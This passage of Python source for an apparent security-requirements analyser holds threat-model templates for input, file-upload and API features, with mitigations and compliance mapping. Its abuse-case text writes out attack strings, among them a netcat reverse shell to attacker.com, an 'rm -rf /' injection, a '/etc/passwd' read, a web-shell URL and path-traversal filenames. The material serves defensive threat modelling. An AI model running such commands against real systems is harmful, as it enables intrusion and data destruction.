                            "Deploy Content Security Policy (CSP) with strict script-src directive",
                            "Set httpOnly flag on session cookies to prevent JavaScript access",
                            "Use DOMPurify for sanitizing any user-generated HTML content",
                            "Implement X-XSS-Protection and X-Content-Type-Options headers"
                        ]
                    },
                    {
                        "title": "Command Injection Attack",
                        "description": "• RECONNAISSANCE: Attacker identifies functionality that may execute system commands (file operations, ping, etc.)\n• WEAPONIZATION: Crafts payloads to break out of intended command and execute arbitrary commands\n• DELIVERY: Injects shell metacharacters via input field: filename; rm -rf / or filename | nc attacker.com 4444 -e /bin/sh\n• EXPLOITATION: Achieves remote code execution on server, installs backdoor or exfiltrates data\n• TECHNICAL DETAILS: If code uses os.system('ping ' + user_input), attacker sends: 8.8.8.8; cat /etc/passwd\n• IMPACT: Complete server compromise, lateral movement, data exfiltration, ransomware deployment\n• BUSINESS IMPACT: Total system breach, regulatory fines, business continuity impact",
                        "threat_actor": "External Attacker",
                        "impact": "Critical",
                        "likelihood": "Medium",
                        "stride_category": "Elevation of Privilege",
                        "mitigations": [
                            "NEVER pass user input to system commands - use language-native libraries instead",
                            "If system commands unavoidable, use allowlist validation and parameterized execution",
                            "Run application with minimal OS privileges (non-root, restricted shell)",
                            "Implement sandboxing (containers, seccomp) to limit command execution scope",
                            "Use subprocess with shell=False in Python, avoid Runtime.exec() with string concatenation in Java",
                            "Deploy RASP (Runtime Application Self-Protection) for command injection detection"
                        ]
                    }
                ],
                "stride_threats": {
                    "T": [{"threat": "SQL/NoSQL injection allowing data modification or deletion", "mitigation": "Parameterized queries, input validation, least privilege DB accounts"}],
                    "I": [{"threat": "Data extraction via injection attacks or XSS", "mitigation": "Output encoding, CSP, parameterized queries"}],
                    "E": [{"threat": "Command injection leading to server compromise", "mitigation": "Avoid system commands, use native libraries, sandboxing"}]
                },
                "requirements": [
                    {
                        "category": "Input Validation",
                        "requirement": "Implement comprehensive input validation with whitelist approach",
                        "priority": "Critical",
                        "rationale": "• First line of defense against injection attacks (SQL, XSS, Command)\n• CWE-20 (Improper Input Validation) is root cause of most vulnerabilities\n• OWASP ASVS V5.1 requires input validation\n• Whitelist validation is more secure than blacklist (blocklist bypass techniques exist)",
                        "acceptance_criteria": "• All inputs validated against expected type, length, format, and range\n• Validation occurs server-side (client-side is insufficient)\n• Unexpected input rejected with generic error message\n• SAST tools report zero input validation findings"
                    },
                    {
                        "category": "Input Validation",
                        "requirement": "Use parameterized queries exclusively for all database operations",
                        "priority": "Critical",
                        "rationale": "• Prevents SQL injection by separating code from data\n• CWE-89 (SQL Injection) consistently in OWASP Top 10\n• OWASP ASVS V5.3.4 mandates parameterized queries\n• ORM usage provides additional abstraction but must still use parameters",
                        "acceptance_criteria": "• Zero string concatenation in SQL queries verified by code review\n• All database access uses ORM or prepared statements\n• SQLMap scan shows no SQL injection vulnerabilities\n• SAST rules for SQL injection show no findings"
                    },
                    {
                        "category": "Input Validation",
                        "requirement": "Implement context-aware output encoding for XSS prevention",
                        "priority": "Critical",
                        "rationale": "• Prevents XSS by encoding output based on context (HTML, JS, URL, CSS)\n• CWE-79 (Cross-Site Scripting) affects millions of applications\n• OWASP ASVS V5.3.3 requires output encoding\n• Modern frameworks provide auto-escaping but developers can bypass it",
                        "acceptance_criteria": "• All user-controlled output encoded appropriately for context\n• CSP deployed with strict script-src (no unsafe-inline)\n• DOM XSS sinks identified and protected\n• DAST scan shows no XSS vulnerabilities"
                    },
                    {
                        "category": "Input Validation",
                        "requirement": "Implement input length and complexity limits",
                        "priority": "High",
                        "rationale": "• Prevents buffer overflow, ReDoS, and resource exhaustion attacks\n• CWE-400 (Resource Exhaustion) via oversized inputs\n• Limits attack surface for injection attempts\n• OWASP ASVS V5.1.3 requires length validation",
                        "acceptance_criteria": "• Maximum length defined for all input fields\n• Regex patterns validated for catastrophic backtracking\n• Large inputs rejected before processing\n• Load tests verify no DoS via large inputs"
                    }
                ],
                "risk_factor": {"factor": "User Input", "score": 20, "description": "Feature accepts user input - primary attack vector"}
            })

        # File upload patterns
        if "upload" in text or "file" in text:
            patterns.append({
                "abuse_cases": [
                    {
                        "title": "Web Shell Upload via File Type Bypass",
                        "description": "• RECONNAISSANCE: Attacker identifies file upload functionality and tests accepted file types\n• WEAPONIZATION: Creates PHP/JSP/ASPX web shell with disguised extension (shell.php.jpg, shell.php%00.jpg)\n• DELIVERY: Uploads malicious file exploiting weak validation (extension-only check, MIME type trust)\n• EXPLOITATION: Accesses uploaded shell via direct URL, gains remote code execution on server\n• TECHNICAL DETAILS: Upload shell.php with Content-Type: image/jpeg; access /uploads/shell.php?cmd=whoami\n• PERSISTENCE: Installs additional backdoors, creates privileged accounts, establishes C2 channel\n• IMPACT: Complete server compromise, lateral movement, data exfiltration, ransomware deployment\n• BUSINESS IMPACT: Total system breach, regulatory fines, incident response costs ($4M+ average breach cost)",
                        "threat_actor": "External Attacker",
                        "impact": "Critical",
                        "likelihood": "High",
                        "stride_category": "Elevation of Privilege",
                        "mitigations": [
                            "Validate file type using magic bytes (file signatures), not extension or MIME type",
                            "Store uploads outside web root with randomized filenames",
                            "Serve files through a handler that sets Content-Disposition: attachment",
                            "Implement antivirus/malware scanning (ClamAV) on all uploads",
                            "Use separate domain for user content (CDN) with no script execution",
                            "Strip metadata and re-encode images to remove embedded code"
                        ]
                    },
                    {
                        "title": "Path Traversal via Filename Manipulation",
                        "description": "• RECONNAISSANCE: Attacker tests filename handling by uploading files with special characters\n• WEAPONIZATION: Crafts filename with path traversal sequences: ../../../etc/passwd or ..\\..\\windows\\system32\n• DELIVERY: Uploads file with malicious filename through intercepted request\n• EXPLOITATION: File saved outside intended directory, potentially overwriting critical system files\n• TECHNICAL DETAILS: Filename: ../../../var/www/html/shell.php overwrites web application files\n• IMPACT: Arbitrary file write leading to RCE, configuration tampering, or data destruction\n• BUSINESS IMPACT: System integrity compromise, potential for complete takeover",
                        "threat_actor": "External Attacker",
                        "impact": "Critical",
                        "likelihood": "Medium",
                        "stride_category": "Tampering",
                        "mitigations": [
                            "Generate server-side filenames (UUID), never use client-provided filenames",
                            "If original filename needed, sanitize by removing path separators and special characters",
                            "Validate final path is within intended upload directory (canonical path check)",
                            "Use chroot or containerization to limit file system access",
                            "Set restrictive file system permissions on upload directory",
                            "Log all file operations with original and sanitized filenames"
                        ]
                    },
                    {
                        "title": "Denial of Service via Resource Exhaustion",
                        "description": "• RECONNAISSANCE: Attacker identifies file upload endpoints and size limits\n• WEAPONIZATION: Creates scripts to upload maximum-size files repeatedly or uses zip bombs\n• DELIVERY: Floods upload endpoint with large files or specially crafted archives\n• EXPLOITATION: Exhausts disk space, memory (during processing), or bandwidth\n• TECHNICAL DETAILS: Upload 10GB file repeatedly; or 42.zip (zip bomb) that expands to 4.5 petabytes\n• IMPACT: Service unavailability, storage costs, processing delays for legitimate users\n• BUSINESS IMPACT: Downtime, SLA violations, infrastructure costs",
                        "threat_actor": "External Attacker / Competitor",
                        "impact": "High",
                        "likelihood": "Medium",
                        "stride_category": "Denial of Service",
                        "mitigations": [
                            "Implement strict file size limits (e.g., 10MB) enforced at web server level",
                            "Use streaming upload processing to reject oversized files early",
                            "Implement per-user and per-IP upload quotas",
                            "Detect and reject archive bombs by limiting decompression ratio",
                            "Use separate storage volume for uploads with quota limits",
                            "Implement rate limiting on upload endpoints"
                        ]
                    }
                ],
                "stride_threats": {
                    "T": [{"threat": "Malicious file execution or system file overwrite via path traversal", "mitigation": "Magic byte validation, server-generated filenames, canonical path checks"}],
                    "D": [{"threat": "Storage/resource exhaustion via large or malicious uploads", "mitigation": "Size limits, quotas, zip bomb detection"}],
                    "E": [{"threat": "Remote code execution via web shell upload", "mitigation": "Store outside web root, no execute permissions, malware scanning"}]
                },
                "requirements": [
                    {
                        "category": "Input Validation",
                        "requirement": "Validate file types using magic bytes and content inspection",
                        "priority": "Critical",
                        "rationale": "• File extension and MIME type can be trivially spoofed by attackers\n• Magic bytes (file signatures) provide reliable file type identification\n• CWE-434 (Unrestricted Upload of File with Dangerous Type)\n• OWASP ASVS V12.1.1 requires file type validation",
                        "acceptance_criteria": "• File type validated by reading first bytes and comparing to known signatures\n• Whitelist of allowed file types enforced (not blacklist)\n• Content inspection performed for complex formats (images re-encoded)\n• Automated tests verify dangerous file types are rejected"
                    },
                    {
                        "category": "Input Validation",
                        "requirement": "Implement malware scanning on all uploaded files",
                        "priority": "High",
                        "rationale": "• Uploaded files may contain malware that affects other users or systems\n• Defense in depth against novel file-based attacks\n• CWE-434 mitigation\n• Required for handling user-generated content at scale",
                        "acceptance_criteria": "• All uploads scanned with antivirus (ClamAV or commercial solution)\n• Infected files quarantined and logged\n• Scan results available within acceptable latency\n• Signature database updated automatically"
                    },
                    {
                        "category": "Input Validation",
                        "requirement": "Enforce file size limits and upload quotas",
                        "priority": "High",
                        "rationale": "• Prevents denial of service via storage exhaustion\n• CWE-400 (Uncontrolled Resource Consumption)\n• Protects infrastructure costs and performance\n• OWASP ASVS V12.1.2 requires size limits",
                        "acceptance_criteria": "• Maximum file size enforced at web server level (10MB default)\n• Per-user storage quota implemented and enforced\n• Oversized uploads rejected before full transfer completes\n• Archive bomb detection rejects files with high compression ratio"
                    },
                    {
                        "category": "Data Protection",
                        "requirement": "Store uploaded files outside web root with restricted access",
                        "priority": "Critical",
                        "rationale": "• Prevents direct execution of uploaded malicious scripts\n• Defense in depth against file type validation bypass\n• CWE-434 mitigation\n• OWASP ASVS V12.3.1 requires secure file storage",
                        "acceptance_criteria": "• Upload directory is outside document root\n• Files served through application handler, not direct URL\n• No execute permissions on upload directory\n• Files served with Content-Disposition: attachment header"
                    }
                ],
                "risk_factor": {"factor": "File Upload", "score": 25, "description": "Feature allows file uploads - high risk for RCE"}
            })

        # API patterns
        api_keywords = ["api", "endpoint", "rest", "graphql", "webhook"]
        if any(kw in text for kw in api_keywords):
            patterns.append({
                "abuse_cases": [
                    {
                        "title": "Broken Object Level Authorization (BOLA/IDOR)",
                        "description": "• RECONNAISSANCE: Attacker analyzes API responses to identify object ID patterns (sequential IDs, UUIDs)\n• WEAPONIZATION: Creates script to enumerate object IDs or manipulate IDs in requests\n• DELIVERY: Modifies API request: GET /api/users/123/orders to GET /api/users/124/orders\n• EXPLOITATION: Accesses other users' data by changing resource identifiers\n• TECHNICAL DETAILS: API returns data based on ID without verifying requestor owns that resource\n• IMPACT: Mass data exposure, privacy violations, access to sensitive records\n• BUSINESS IMPACT: GDPR/CCPA violations, customer data breach, regulatory fines",
                        "threat_actor": "External Attacker / Malicious User",
                        "impact": "Critical",
                        "likelihood": "High",
                        "stride_category": "Information Disclosure",
                        "mitigations": [
                            "Implement object-level authorization checks on every API endpoint",
                            "Use indirect references (user-specific mapping) instead of direct database IDs",
                            "Verify resource ownership against authenticated user context",
                            "Use UUIDs instead of sequential IDs to prevent enumeration",
                            "Implement automated BOLA testing in CI/CD pipeline",
                            "Log and alert on access pattern anomalies"
                        ]
                    },
                    {
                        "title": "API Rate Limiting Bypass and Abuse",
                        "description": "• RECONNAISSANCE: Attacker tests rate limits by sending requests at increasing rates\n• WEAPONIZATION: Identifies bypass techniques: rotating IPs, API key cycling, header manipulation\n• DELIVERY: Launches distributed attack from multiple IPs or exploits rate limit per-endpoint gaps\n• EXPLOITATION: Overwhelms API with requests causing DoS, or performs mass data scraping\n• TECHNICAL DETAILS: 10,000 requests/minute from botnet; or scrapes entire user database via pagination\n• IMPACT: Service degradation, infrastructure costs, competitive data theft\n• BUSINESS IMPACT: SLA violations, customer impact, increased cloud costs",
                        "threat_actor": "External Attacker / Competitor / Automated Bot",
                        "impact": "High",
                        "likelihood": "High",
                        "stride_category": "Denial of Service",
                        "mitigations": [
                            "Implement tiered rate limiting: per-IP, per-user, per-API-key, global",
                            "Use token bucket or sliding window algorithms for rate limiting",
                            "Deploy API gateway with DDoS protection (AWS API Gateway, Cloudflare)",
                            "Implement request signing to prevent replay attacks",
                            "Monitor and alert on unusual traffic patterns",
                            "Use CAPTCHA for sensitive operations after threshold"
                        ]
                    },
                    {
                        "title": "Mass Assignment / Excessive Data Exposure",
                        "description": "• RECONNAISSANCE: Attacker examines API responses for unexpected data fields\n• WEAPONIZATION: Adds additional fields to POST/PUT requests to modify protected attributes\n• DELIVERY: Sends request with extra fields: PUT /api/users/me {\"name\": \"John\", \"role\": \"admin\", \"balance\": 999999}\n• EXPLOITATION: Modifies fields not intended to be user-controllable (role, permissions, balance)\n• TECHNICAL DETAILS: API blindly binds request body to database model without filtering\n• IMPACT: Privilege escalation, data tampering, financial fraud\n• BUSINESS IMPACT: Unauthorized access, data integrity issues, compliance violations",
                        "threat_actor": "External Attacker / Malicious User",
                        "impact": "High",
                        "likelihood": "Medium",
                        "stride_category": "Tampering",
                        "mitigations": [
                            "Define explicit allowlist of fields that can be modified per endpoint",
                            "Use DTOs/schemas that only include intended fields (Pydantic, Marshmallow)",
                            "Never bind request body directly to database models",
                            "Remove sensitive fields from API responses (password hash, internal IDs)",
                            "Implement field-level authorization for sensitive attributes",
                            "Document and test all API fields with security review"
                        ]
                    }
                ],
                "stride_threats": {
                    "S": [{"threat": "API key theft, JWT forgery, or authentication bypass", "mitigation": "Secure key storage, short-lived tokens, proper JWT validation"}],
                    "I": [{"threat": "Excessive data exposure in API responses or BOLA attacks", "mitigation": "Response filtering, object-level authorization, minimal data principle"}],
                    "D": [{"threat": "API abuse causing service degradation or cost explosion", "mitigation": "Multi-layer rate limiting, API gateway, DDoS protection"}]
                },
                "requirements": [
                    {
                        "category": "Authentication",
                        "requirement": "Implement secure API authentication using OAuth 2.0 or JWT",
                        "priority": "Critical",
                        "rationale": "• APIs are primary attack surface for modern applications\n• OWASP API Security Top 10 - API2:2023 Broken Authentication\n• JWT must be properly validated (signature, expiry, issuer, audience)\n• API keys should be rotatable and have minimal scope",
                        "acceptance_criteria": "• All API endpoints require authentication except explicitly public ones\n• JWT validation includes signature, expiry, issuer, and audience checks\n• API keys are hashed in storage, rotatable, and audited\n• Authentication failures return generic errors (no user enumeration)"
                    },
                    {
                        "category": "Authorization",
                        "requirement": "Implement object-level authorization on all data access endpoints",
                        "priority": "Critical",
                        "rationale": "• BOLA/IDOR is #1 API vulnerability (OWASP API Top 10 2023)\n• Every request must verify user has access to requested resource\n• CWE-639 (Authorization Bypass Through User-Controlled Key)\n• Cannot rely solely on authentication - authorization is separate concern",
                        "acceptance_criteria": "• Every endpoint verifies resource ownership before returning data\n• Automated BOLA tests in CI/CD pipeline\n• Access denied for resources not owned by authenticated user\n• Audit log captures all authorization decisions"
                    },
                    {
                        "category": "Rate Limiting",
                        "requirement": "Implement multi-layer API rate limiting with adaptive thresholds",
                        "priority": "High",
                        "rationale": "• Prevents DoS, brute force, and scraping attacks\n• OWASP API Security Top 10 - API4:2023 Unrestricted Resource Consumption\n• Protects infrastructure costs and availability\n• CWE-770 (Allocation of Resources Without Limits)",
                        "acceptance_criteria": "• Rate limits enforced per-IP, per-user, and per-API-key\n• Limits documented in API specification\n• 429 responses include Retry-After header\n• Anomaly detection alerts on unusual patterns"
                    },
                    {
                        "category": "Logging",
                        "requirement": "Comprehensive API request/response logging with security context",
                        "priority": "High",
                        "rationale": "• Essential for incident detection and forensic analysis\n• OWASP API Top 10 - API9:2023 Improper Inventory Management\n• Required for compliance (PCI-DSS, SOC2)\n• Enables threat hunting and anomaly detection",
                        "acceptance_criteria": "• All API calls logged with timestamp, user, IP, endpoint, response code\n• Sensitive data redacted from logs (passwords, tokens, PII)\n• Logs forwarded to SIEM with alerting rules\n• Log retention meets compliance requirements"
                    }
                ],
                "risk_factor": {"factor": "API Exposure", "score": 20, "description": "Feature exposes API endpoints - significant attack surface"}
            })

        return patterns

    def _get_baseline_requirements(self) -> List[Dict]:
        """Return baseline security requirements"""
        return [
            {
                "id": "SR-001",
                "category": "Input Validation",
                "requirement": "All user inputs must be validated and sanitized",
                "priority": "must",
                "rationale": "Prevents injection attacks",
                "acceptance_criteria": "No raw user input reaches database or output"
            },
            {
                "id": "SR-002",
                "category": "Error Handling",
                "requirement": "Error messages must not expose sensitive information",
                "priority": "must",
                "rationale": "Prevents information disclosure",
                "acceptance_criteria": "Generic error messages shown to users"
            },
            {
                "id": "SR-003",
                "category": "Logging",
                "requirement": "Security-relevant events must be logged",
                "priority": "should",
                "rationale": "Enables security monitoring and incident response",
                "acceptance_criteria": "Audit logs capture who, what, when, where"
            }
        ]

    def _validate_and_enhance_result(self, result: Dict) -> Dict:
        """Validate and enhance AI-generated result to match securereq-ai format"""
        # Ensure all required fields exist
        if "abuse_cases" not in result:
            result["abuse_cases"] = []
        if "stride_threats" not in result:
            result["stride_threats"] = []
        if "security_requirements" not in result:
            result["security_requirements"] = self._get_baseline_requirements()
        if "risk_score" not in result:
            result["risk_score"] = 50

        # Normalize abuse cases - ensure consistent field names for Jira ADF builder
        for ac in result.get("abuse_cases", []):
            # Ensure both 'threat' and 'title' exist (ADF uses both)
            if "title" not in ac and "threat" in ac:
                ac["title"] = ac["threat"]
            if "threat" not in ac and "title" in ac:
                ac["threat"] = ac["title"]
            # Ensure 'actor' field exists (securereq-ai format)
            if "actor" not in ac and "threat_actor" in ac:
                ac["actor"] = ac["threat_actor"]
            if "threat_actor" not in ac and "actor" in ac:
                ac["threat_actor"] = ac["actor"]
            # Ensure mitigations is a list
            if "mitigations" not in ac:
                ac["mitigations"] = []
            elif isinstance(ac["mitigations"], str):
                ac["mitigations"] = [ac["mitigations"]]

        # Normalize security requirements - ensure both 'text' and 'requirement' exist
        for req in result.get("security_requirements", []):
            if "text" not in req and "requirement" in req:
                req["text"] = req["requirement"]
            if "requirement" not in req and "text" in req:
                req["requirement"] = req["text"]
            # Map 'details' to other fields for display
            if "details" in req:
                if "rationale" not in req:
                    req["rationale"] = req["details"]
                if "implementation_guidance" not in req:
                    req["implementation_guidance"] = req["details"]

        # Handle stride_threats - can be list (securereq-ai) or dict (old format)
        stride_threats = result.get("stride_threats", [])
        if isinstance(stride_threats, dict):
            # Convert dict format to list format for consistency
            threats_list = []
            for cat_id, threats in stride_threats.items():
                cat_name = {
                    "S": "Spoofing", "T": "Tampering", "R": "Repudiation",
                    "I": "Information Disclosure", "D": "Denial of Service", "E": "Elevation of Privilege"
                }.get(cat_id, cat_id)
                for threat in threats:
                    threats_list.append({
                        "category": cat_name,
                        "threat": threat.get("threat", ""),
                        "description": threat.get("attack_scenario", threat.get("mitigation", "")),
                        "risk_level": "High"
                    })
            result["stride_threats"] = threats_list

        return result

    def map_to_compliance(self, requirements: List[Dict], standards: List[str] = None) -> List[Dict]:
        """Map security requirements to compliance standards"""
        if standards is None:
            standards = ["OWASP ASVS", "PCI-DSS"]

        mappings = []
        for req in requirements:
            category = req.get("category", "").lower()
            req_text = req.get("requirement", "").lower()

            for standard in standards:
                if standard not in self.COMPLIANCE_STANDARDS:
                    continue

                for control_id, control_title in self.COMPLIANCE_STANDARDS[standard].items():
                    relevance = self._calculate_relevance(category, req_text, control_title.lower())
                    if relevance > 0.3:
                        mappings.append({
                            "requirement_id": req["id"],
                            "requirement_text": req["requirement"],
                            "standard_name": standard,
                            "control_id": control_id,
                            "control_title": control_title,
                            "relevance_score": relevance,
                            "mapping_rationale": f"Requirement addresses {control_title}"
                        })

        return mappings

    def _calculate_relevance(self, category: str, req_text: str, control_title: str) -> float:
        """Calculate relevance score between requirement and control"""
        score = 0.0

        # Category matching
        category_map = {
            "authentication": ["authentication", "identity"],
            "authorization": ["access control", "restrict"],
            "input validation": ["validation", "sanitization", "encoding"],
            "data protection": ["data protection", "cryptography", "protect"],
            "logging": ["logging", "monitoring", "log"],
            "error handling": ["error", "handling"],
        }

        for cat_key, keywords in category_map.items():
            if cat_key in category:
                for kw in keywords:
                    if kw in control_title:
                        score += 0.4

        # Keyword matching in requirement text
        control_words = control_title.split()
        for word in control_words:
            if len(word) > 3 and word in req_text:
                score += 0.1

        return min(1.0, score)


# Global instance
security_analyzer = SecurityRequirementsAnalyzer()
